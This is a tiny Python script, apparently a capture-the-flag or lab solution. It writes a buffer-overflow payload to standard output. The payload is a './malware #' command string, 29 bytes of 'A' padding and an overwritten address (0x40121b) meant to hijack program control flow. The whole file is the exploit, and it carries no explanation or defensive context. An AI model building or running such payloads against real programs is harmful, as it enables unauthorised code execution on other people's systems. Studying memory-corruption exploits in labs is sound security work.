import sys

payload = b'./malware #' + b'A' * 0x1D + b'\x1b\x12\x40\x00\x00\x00\x00\x00'
sys.stdout.buffer.write(payload)